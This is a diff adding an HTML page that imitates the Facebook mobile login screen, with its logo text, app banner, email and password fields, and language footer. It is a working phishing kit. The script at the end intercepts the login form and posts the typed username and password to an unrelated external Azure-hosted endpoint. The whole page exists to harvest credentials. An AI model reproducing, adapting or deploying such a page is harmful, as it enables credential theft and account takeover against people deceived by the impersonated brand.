@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js" integrity="sha512-F5QTlBqZlvuBEs9LQPqc1iZv2UMxcVXezbHzomzS6Df4MZMClge/8+gXrKw2fl5ysdk4rWjR0vKS7NNkfymaBQ==" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.0/axios.min.js" integrity="sha512-DZqqY3PiOvTP9HkjIWgjO6ouCbq+dxqWoJZ/Q+zPYNHmlnI2dQnbJ5bxAHpAMw+LXRm4D72EIRXzvcHQtE8/VQ==" crossorigin="anonymous"></script>
+    <title>Document</title>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+        }
+       .header-title {    
+       background-color: #fffbe2;
+       height: 48px;
+       display: flex;
+       justify-content: space-between;
+       width: 100%;
+       padding: 10px;
+       color: #576b95;
+       font-size: 13px;
+        }
+        .logo{
+            max-width: 40px;
+        }
+        .title{
+            flex-grow: 1;
+            padding-left: 10px;
+        }
+        .baner-title{
+            text-align: center;
+            height: 60px;
+            color: #1877f2;
+            padding: 10px;
+        }
+        .line-or{
+            
+            display: flex;
+            justify-content: space-around;
+            border-bottom: #ccc 1px solid;
+            height: 20px;
+            position: relative;
+        }
+        .line-or .logo-upload{
+            width: 30px;
+            height: 100%;
+            text-align: center;
+            position: absolute;
+            background: #fff;
+            bottom: -50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 5px;
+
+        }
+        .btn-success{
+            background: #00a400 !important;
+
+        }
+        .footer{
+            display: flex;
+            justify-content: space-between
+
+        }
+        li{
+            list-style: none;
+        }
+        a{
+            text-decoration: none;
+            display: block;
+            color: #576b95;
+            font-size: 9px;
+            line-height: 13px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-title">
+            <i class="fa fa-mobile fa-2x logo" aria-hidden="true"></i>
+            <span class="title">Get Facebook for Android and browse faster.</span>
+        </div>
+        <div class="baner-title">
+            <h2>facebook</h2>
+        </div>
+    </header>
+    <div class="container">
+        
+        <div class="container-flued">
+            <form id="form1" >
+                <input class="form-control mb-2" type="text" placeholder="Mobile number or email" aria-label="Mobile number or email" id="email" name="email" required>
+                <input class="form-control mb-2" type="password" placeholder="Password" aria-label="Password"  id="pass" name="pass" required>
+                <button type="submit" class="btn btn-primary form-control" >Log In</button>
+                <div class="line-or">
+                    <span class="logo-upload"> <span>or</span></span>
+                </div>
+                <div class="container text-center">
+                    <button type="button" class="btn btn-success mt-4">Create New Account</button>
+                    <p><a href="">Forgot Password?</a></p>
+                </div>
+
+            </form>
+
+            <div class="footer">
+                <div class="item">
+                    <ul>
+                        <li> <a href="">English (US)</a></li>
+                        <li> <a href="">Français (France)</a></li>
+                        <li> <a href="">Português (Brasil)</a></li>
+                        <li> <a href="">العربية</a></li>
+                    </ul>
+                </div>
+                <div class="item">
+                    <br><br>
+                    <ul>
+                        <li> <a href="">Facebook Inc.</a></li>
+                    </ul>
+                </div>
+                <div class="item">
+                    <ul>
+                        <li> <a href="">Español (España)</a></li>
+                        <li> <a href="">Italiano</a></li>
+                        <li> <a href="">Deutsch</a></li>
+                        <li> <a href=""><i class="far fa-plus-square"></i></a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+  let form1=      document.getElementById("form1")
+  form1.addEventListener("submit",sandeFormu,false)
+function sandeFormu(ev){
+   
+    ev.preventDefault()
+    // Make a request for a user with a given ID
+    let username = document.getElementById('email').value
+    let password = document.getElementById('pass').value
+axios.post('https://ethikadmin.azurewebsites.net/api/account',{
+    username: username,
+    password: password,
+})
+  .then(function (response) {
+    // handle success
+    console.log(response);
+  })
+  .catch(function (error) {
+    // handle error
+    console.log(error);
+  })
+  .then(function () {
+    // always executed
+  });
+}
+    </script>
+</body>
+</html>
